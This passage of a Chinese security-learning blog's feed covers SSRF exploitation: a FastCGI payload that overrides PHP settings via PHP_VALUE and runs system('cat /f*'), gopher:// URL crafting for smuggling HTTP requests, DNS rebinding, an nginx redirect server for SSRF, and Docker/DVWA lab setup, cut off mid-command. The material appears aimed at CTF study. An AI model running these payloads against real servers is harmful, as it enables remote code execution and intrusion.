class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;go / fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;9000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;59&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST_DATA&#x27;</span>: <span class="string">&#x27;&lt;?php system(\&#x27;</span><span class="built_in">cat</span> /f*\&#x27;);die(\&#x27;-----Made-by-SpyD3r-----\&#x27;);?&gt;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>}</p><p>PHP_VALUE</p><p>这个部分用于设置PHP的配置指令。它可以通过FastCGI协议传递给PHP解释器，以覆盖默认的PHP配置</p><blockquote><ul><li><strong>allow_url_include &#x3D; On</strong>:<ul><li>允许使用URL作为<code>include</code>和<code>require</code>语句的目标。这意味着可以通过URL来包含远程文件。</li></ul></li><li><strong>disable_functions &#x3D;</strong>:<ul><li>禁用的PHP函数列表。在这里是空的，意味着没有禁用任何函数。</li></ul></li><li><strong>auto_prepend_file &#x3D; php:&#x2F;&#x2F;input</strong>:<ul><li>指定在每个请求开始时自动包含的文件。<code>php://input</code>是一个只读流，可以访问请求的原始POST数据。这里设置为<code>php://input</code>，意味着PHP会在处理请求之前读取并执行POST数据中的内容。</li></ul></li></ul></blockquote><p>POST_DATA</p><p>这个部分表示通过POST请求发送的数据。</p><p>经过一系列配合即可，不过要注意多次编码。</p><h4 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h4><p>怎么说呢，我都是用脚本</p><h3 id="DNS-rebinding"><a href="#DNS-rebinding" class="headerlink" title="DNS rebinding"></a>DNS rebinding</h3><p><a href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)</a></p><p>工具：<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service (cmpxchg8b.com)</a></p><blockquote><p>DNS重绑定DNS Rebinding攻击在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><h3 id="他人经验"><a href="#他人经验" class="headerlink" title="他人经验"></a>他人经验</h3><blockquote><p>虽然这篇文章都是基于CTF来分析SSRF相关知识的，但是我觉得可以从这些CTF题目中延伸出一些渗透攻击的思路。</p><p>就比如：如果我们发现一处SSRF，我们可以使用使用<code>file</code> 伪协议读取敏感信息，http&#x2F;s和dict<code>协议判断内网存活主机和端口，从端口判断内网中存在的服务。</code></p><p>当我们发现<code>redis/fastcgi/mysql</code>等服务时， 我们可以利用协议<code>gopher</code>和工具 <code>gopherus</code> 进行getshell。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gopher入门</title>
      <link href="/2024/05/18/Gopher%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/18/Gopher%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-闲话"><a href="#0x00-闲话" class="headerlink" title="0x00 闲话"></a>0x00 闲话</h1><p>em，这估计就是我的风格了。Gopher广泛用于SSRF，不可不认真学。                                                                                                                                           </p><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </a></p><h1 id="0x01-概况"><a href="#0x01-概况" class="headerlink" title="0x01 概况"></a>0x01 概况</h1><p>Gopher是互联网早期的一种协议。</p><blockquote><p>利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面。</p></blockquote><p>Gopher至少在PHP还是比较支持的。</p><h1 id="0x02-格式"><a href="#0x02-格式" class="headerlink" title="0x02 格式"></a>0x02 格式</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gopher:</span>//&lt;host&gt;<span class="symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="title class_">TCP</span>数据流</span><br></pre></td></tr></table></figure><p>注意几点：</p><ul><li>gopher的默认端口是70</li><li>如果是post请求，回车换行要用到<code>%0d%0a</code>(post请求有几个必备请求头)</li><li>基于post请求，如果有多个参数，也要把<code>&amp;</code>进行URL编码</li></ul><h2 id="Gopher发送HTTP-GET请求"><a href="#Gopher发送HTTP-GET请求" class="headerlink" title="Gopher发送HTTP GET请求"></a>Gopher发送HTTP GET请求</h2><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>这里端口先开一个，姑且称之为num（已经有负载的端口不行哦）</p><p>监听：<code>nc -lvp num</code></p><p>发送：<code>gopher://555.555.555.555:num/_abcd</code></p><p>返回：<code>abcd</code></p><p>没错，第一个字符给弄没了，这个很好解决（解决的方法就是不解决）</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>三步：</p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为%0d%0a</li><li>发送gopher协议</li></ol><p>注意事项：</p><ul><li>问号（？）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ul><p>eg：</p><p>PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/get.php?name=haandsome</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>555.555.555.555</span><br></pre></td></tr></table></figure><p>构造请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">555.555.555.555</span>/_GET /ssrf/get.php?name=handsome HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">555.555.555.555</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编码（这里是一次的，一般情况下要两次，我还没搞懂）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">555.555.555.555:80</span>/_GET%<span class="number">20</span>/ssrf/base/get.php%<span class="number">3</span>fname=Margin%<span class="number">20</span>HTTP/<span class="number">1</span>.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>AHost:%<span class="number">20192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">109</span>%<span class="number">0</span>d%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><blockquote><p>tip： URL 编码中，<code>%0A</code> 和 <code>%0a</code> 实际上是表示相同的字符，即换行符。它们之间的区别在于大小写。在 URL 编码中，字母的大小写通常是不敏感的，因此 <code>%0A</code> 和 <code>%0a</code> 都会被解释为换行符。</p></blockquote><h2 id="Gopher发送HTTP-POST请求"><a href="#Gopher发送HTTP-POST请求" class="headerlink" title="Gopher发送HTTP POST请求"></a>Gopher发送HTTP POST请求</h2><p>格式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/post.php HTTP/1.1</span><br><span class="line">host:555.555.555.555</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=handsome</span><br></pre></td></tr></table></figure><p>这几个请求头不能少</p><p>写包：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gopher:</span>/<span class="regexp">/555.555.555.555:80/</span>_POST /ssrf/base/post.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">192.168</span>.<span class="number">0.109</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">11</span></span><br><span class="line"></span><br><span class="line">name=<span class="title class_">Margin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>url编码（实际操作要两次）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">555.555.555.555:80</span>/_POST%<span class="number">20</span>%<span class="number">2</span>Fssrf%<span class="number">2</span>Fbase%<span class="number">2</span>Fpost.php%<span class="number">20</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AHost%<span class="number">3</span>A<span class="number">555.555.555.555</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>Aapplication%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A11%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aname%<span class="number">3</span>Dhandsome%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><h2 id="SSRF-Gopher-URL编码两次"><a href="#SSRF-Gopher-URL编码两次" class="headerlink" title="SSRF Gopher URL编码两次"></a>SSRF Gopher URL编码两次</h2><p>推荐文章：</p><p><a href="https://blog.csdn.net/2202_75361164/article/details/137092879">https://blog.csdn.net/2202_75361164/article/details/137092879</a></p><p><a href="https://cloud.tencent.com/developer/article/2348163">https://cloud.tencent.com/developer/article/2348163</a></p><p>引用：</p><blockquote><p>传参经过多少次跳转就需要经过多少次url编码。 </p><p>直接curl后接gopher:&#x2F;&#x2F;就编码一次。 </p><p>利用?url&#x3D;gopher:&#x2F;&#x2F;就编码两次。 </p><p>还经过302跳转，就编码三次。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器配置重定向文件</title>
      <link href="/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/"/>
      <url>/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-必要性"><a href="#0x00-必要性" class="headerlink" title="0x00 必要性"></a>0x00 必要性</h1><p>我还是喜欢在Blog唠嗑一下，虽然但是没什么人看。天生愚笨，此事耗时较久。但是安全一路本就是坎坷之途，越是困难越要战胜它。</p><p>附：我好奇问一下读者，作为一名hacker，你能从上面这段话收集多少信息。</p><h1 id="0x01-nginx配置"><a href="#0x01-nginx配置" class="headerlink" title="0x01 nginx配置"></a>0x01 nginx配置</h1><p>推荐视频：<br><a href="https://www.bilibili.com/video/BV1TZ421b7SD/?buvid=XXDF6E8DE20DA6F53F6CC5333D761BB13D2A1&from_spmid=tm.recommend.0.0&is_story_h5=false&mid=QHgqGMtTZKjaL9iy62qH+w==&p=1&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=7bf31926-0363-48ac-9b29-906b6edc2662&share_source=QQ&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1713205026&unique_k=cgEOBK6&up_id=327247876&vd_source=d83686f059ea042739e28bbbc78335f3">Nginx入门必须懂3大功能配置 - Web服务器&#x2F;反向代理&#x2F;负载均衡_哔哩哔哩_bilibili</a></p><h2 id="一-基础理解"><a href="#一-基础理解" class="headerlink" title="一. 基础理解"></a>一. 基础理解</h2><p>我被一个文件和两个目录困扰</p><p><code>.../nginx.conf</code> 总配置文件 注意一行代码：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span></span> .../sites-enabled<span class="comment">/*;</span></span><br></pre></td></tr></table></figure><p><code>.../sites-enabled</code></p><p>很明显这个目录可以写配置</p><p><code>../sites-availabled</code></p><p>这个一般来说就不行了</p><p><a href="https://www.jianshu.com/p/42c4ffd044e6">https://www.jianshu.com/p/42c4ffd044e6</a></p><p>看不懂，先这样理解。</p><h2 id="二-配置代码理解"><a href="#二-配置代码理解" class="headerlink" title="二. 配置代码理解"></a>二. 配置代码理解</h2><p>在<code>enabled</code>下创建<code>port_handsome</code>(这只是一个名称.jpg)，代码如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">listen port;</span><br><span class="line">server_name IP;</span><br><span class="line">root /var/www/html;</span><br><span class="line">index 帅哥.php;</span><br><span class="line"></span><br><span class="line"><span class="keyword">location</span> <span class="title">/ &#123;</span></span><br><span class="line"><span class="title">try_files</span> $uri $uri/ =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">location</span> <span class="title">~ \.php</span>$ &#123;</span><br><span class="line">include snippets/fastcgi-php.conf;</span><br><span class="line">       fastcgi_pass unix:/var/run/php/php8.<span class="number">1</span>-fpm.sock;  <span class="comment"># 确保这里的版本号与安装的PHP版本匹配</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">location</span> <span class="title">~ /\.ht</span> &#123;</span><br><span class="line">        <span class="keyword">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="server-块"><a href="#server-块" class="headerlink" title="server 块"></a>server 块</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br></pre></td></tr></table></figure><p>这个块定义了一个虚拟服务器的配置，所有的配置指令都在这个块内。</p><h4 id="listen-指令"><a href="#listen-指令" class="headerlink" title="listen 指令"></a>listen 指令</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">614</span>;</span><br></pre></td></tr></table></figure><p><code>listen</code> 指令指定Nginx监听的端口号。在这个例子中，Nginx将监听614端口。</p><h4 id="server-name-指令"><a href="#server-name-指令" class="headerlink" title="server_name 指令"></a>server_name 指令</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">server_name</span> IP;</span><br></pre></td></tr></table></figure><p><code>server_name</code> 指令指定了这个虚拟服务器的服务器名称或IP地址。在这个例子中，服务器名称是 <code>555.555.555.555</code>。</p><h4 id="root-指令"><a href="#root-指令" class="headerlink" title="root 指令"></a>root 指令</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span> /var/www/html;</span><br></pre></td></tr></table></figure><p><code>root</code> 指令设置了服务器根目录。在这个例子中，根目录是 <code>/var/www/html</code>，即所有的请求文件都相对于这个目录。</p><h4 id="index-指令"><a href="#index-指令" class="headerlink" title="index 指令"></a>index 指令</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span> <span class="literal">redirect</span>.php;</span><br></pre></td></tr></table></figure><p><code>index</code> 指令指定了默认的索引文件。在这个例子中，当访问根目录时，默认文件是 <code>redirect.php</code>。</p><h3 id="location-块"><a href="#location-块" class="headerlink" title="location &#x2F; 块"></a>location &#x2F; 块</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>location /</code> 块定义了对根路径的请求处理方式。<code>try_files</code> 指令尝试按顺序查找文件：</p><ol><li><code>$uri</code>：请求的URI。</li><li><code>$uri/</code>：请求的URI作为目录。</li><li><code>=404</code>：如果前两个都找不到，返回404错误。</li></ol><h3 id="location-php-块"><a href="#location-php-块" class="headerlink" title="location ~ .php$ 块"></a>location ~ .php$ 块</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php8.1-fpm.sock;  <span class="comment"># 确保这里的版本号与安装的PHP版本匹配</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>location ~ \.php$</code> 块定义了对PHP文件的请求处理方式：</p><ol><li><code>include snippets/fastcgi-php.conf</code>：包含了FastCGI的配置片段。</li><li><code>fastcgi_pass unix:/var/run/php/php8.1-fpm.sock</code>：将PHP请求传递给PHP-FPM服务，通过Unix套接字通信。这里的版本号需要与实际安装的PHP版本匹配。</li></ol><h3 id="location-ht-块"><a href="#location-ht-块" class="headerlink" title="location ~ &#x2F;.ht 块"></a>location ~ &#x2F;.ht 块</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ /\.ht</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>location ~ /\.ht</code> 块定义了对以 <code>.ht</code> 开头的文件的请求处理方式：</p><ul><li><code>deny all</code>：拒绝所有访问。这通常用于保护 <code>.htaccess</code> 文件，不让它们被外部访问。</li></ul><h1 id="0x02-重定向代码"><a href="#0x02-重定向代码" class="headerlink" title="0x02 重定向代码"></a>0x02 重定向代码</h1><p>filename：R.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://555.555.555.555:555/R.php&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x03-善后"><a href="#0x03-善后" class="headerlink" title="0x03 善后"></a>0x03 善后</h1><p>检查配置是否错误：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nginx -t</span></span><br></pre></td></tr></table></figure><p> 重载：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl reload nginx</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器部署Docker及搭建各类环境</title>
      <link href="/2024/05/03/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/03/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-Why"><a href="#0x00-Why" class="headerlink" title="0x00 Why"></a>0x00 Why</h1><p>为什么要搞服务器，为什么要学Docker，为什么要自己搭建靶场？这些都是基本功，逃避是没有用的。</p><h1 id="0x01-买服务器"><a href="#0x01-买服务器" class="headerlink" title="0x01 买服务器"></a>0x01 买服务器</h1><p>我买的是阿里云的服务器，贴个官网链接：<a href="https://cn.aliyun.com/">阿里云-计算，为了无法计算的价值 (aliyun.com)</a></p><h1 id="0x02-部署Docker"><a href="#0x02-部署Docker" class="headerlink" title="0x02 部署Docker"></a>0x02 部署Docker</h1><p>推荐教程：<a href="https://zhuanlan.zhihu.com/p/651148141?utm_id=0">最详细的ubuntu 安装 docker教程 - 知乎 (zhihu.com)</a></p><h2 id="一-卸载Ubuntu自带的Docker"><a href="#一-卸载Ubuntu自带的Docker" class="headerlink" title="一. 卸载Ubuntu自带的Docker"></a>一. 卸载Ubuntu自带的Docker</h2><p>以下操作最好用管理员</p><blockquote><p>注：docker的旧版本不一定被称为docker，<a href="https://link.zhihu.com/?target=http://docker.io">http://docker.io</a> 或 docker-engine也有可能，所以我们卸载的命令为：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><p>如果报错也正常，有些Ubuntu没有Docker，直接下一步。</p><h2 id="二-安装Docker及相关配置"><a href="#二-安装Docker及相关配置" class="headerlink" title="二. 安装Docker及相关配置"></a>二. 安装Docker及相关配置</h2><p>· 更新软件包和已安装的软件的版本：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure><p>· 安装Docker依赖：</p><blockquote><p>Docker在Ubuntu上依赖一些软件包。执行以下命令来安装这些依赖:</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><p>· 添加Docker官方GPG密钥</p><blockquote><p>执行以下命令来添加Docker官方的GPG密钥:</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>· 添加Docker软件源</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><p>· 安装Docker（可算进入正题了）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>· 配置用户组</p><blockquote><p>默认情况下，只有root用户和docker组的用户才能运行Docker命令。我们可以将当前用户添加到docker组，以避免每次使用Docker时都需要使用sudo。命令如下：</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG docker $USER</span><br></pre></td></tr></table></figure><blockquote><p><strong>注：重新登录才能使更改生效。</strong></p></blockquote><p>· 运行Docker</p><p>启动一下Docker看看有没有安装成功</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>· 安装工具（执行指令即可，原理我也不懂）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>· 重启Docker</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>· 验证是否成功</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><blockquote><p>因为我们之前没有拉取过<code>hello-world</code>，所以运行命令后会出现本地没有该镜像，并且会自动拉取的操作。</p></blockquote><p>· 查看镜像（image）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>出现了<code>hello-world</code>的镜像即可</p><p>至此Docker部署成功，看推荐文章更好。</p><h1 id="0x03-搭建DVWA靶场"><a href="#0x03-搭建DVWA靶场" class="headerlink" title="0x03 搭建DVWA靶场"></a>0x03 搭建DVWA靶场</h1><p>推荐文章：<a href="https://juejin.cn/post/7076807703565336612">https://juejin.cn/post/7076807703565336612</a></p><h2 id="一-准备工作"><a href="#一-准备工作" class="headerlink" title="一. 准备工作"></a>一. 准备工作</h2><p>开端口：</p><p>打开控制台，安全组的管理规则开一个端口，假设为1314。然后连上服务器（我使用xshell）</p><p>启动Docker：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> 